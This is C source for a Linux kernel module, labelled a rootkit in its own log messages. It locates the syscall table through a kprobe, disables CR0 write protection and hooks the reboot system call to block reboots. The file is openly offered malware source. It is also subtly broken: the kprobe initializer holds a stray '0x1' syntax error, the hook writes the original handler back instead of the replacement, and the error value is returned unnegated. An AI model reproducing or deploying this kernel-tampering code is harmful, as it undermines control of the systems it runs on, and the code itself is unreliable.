#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/syscalls.h>



MODULE_LICENSE("GPL");

//unsigned long *__sys_call_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");

static void custom_cr0(long value) {

    __asm__ volatile("mov %0, %%cr0" :: "r"(value) : "memory");
}

#define disable_write_protection() custom_cr0(read_cr0() & (~0x10000))
#define enable_write_protection() custom_cr0(read_cr0() | (0x10000))
#define enable_reboot 0

unsigned long *__sys_call_table_address;
asmlinkage int (*old_reboot_sys_call)(int,int,int,void*);


/* static void revise_reboot(void *new_func){
    old_reboot = __sys_call_table_address[__NR_reboot];
    __sys_call_table_address[__NR_reboot] = (unsigned long)new_func;
    enable_write_protection();
}
 */

static struct kprobe kp = {

    .symbol_name = "kallsyms_lookup_name"0x1
}; 

typedef unsigned long(*kallsyms_lookup_name_t)(const char *name);
unsigned long* get_system_call_table_address(void){
    kallsyms_lookup_name_t kallsyms_lookup_name;
    register_kprobe(&kp);
    kallsyms_lookup_name = (kallsyms_lookup_name_t)kp.addr;
    unregister_kprobe(&kp);
unsigned long *address = (unsigned long*)kallsyms_lookup_name("sys_call_table");
return address;

}

asmlinkage int hacker_reboot(int magic1, int magic2, int cmd, void *arg){
    if(enable_reboot){
        return old_reboot_sys_call(magic1, magic2, cmd, arg);
    }
    printk(KERN_NOTICE "Rootkit: Blocked reboot call! Hahaha!");
    return EPERM;
}

void hook_sys_call(void){
    old_reboot_sys_call = __sys_call_table_address[__NR_reboot];
    disable_write_protection();
    __sys_call_table_address[__NR_reboot] = (unsigned long)old_reboot_sys_call;
    enable_write_protection();
    printk(KERN_NOTICE "Rootkit: Hooked reboot call");


}

void restore_reboot_sys_call(void){
    disable_write_protection();
    __sys_call_table_address[__NR_reboot] = (unsigned long)old_reboot_sys_call;
    enable_write_protection();
}


static int __init open_function(void){
    
    pr_info("The kernel is initializing \n");
    __sys_call_table_address = get_system_call_table_address();
    hook_sys_call();
    return 0;
}

static void __exit mod_exit(void)
{
    pr_info("The kernel is exiting\n");
    restore_reboot_sys_call(); 
}

module_init(open_function);
module_exit(mod_exit);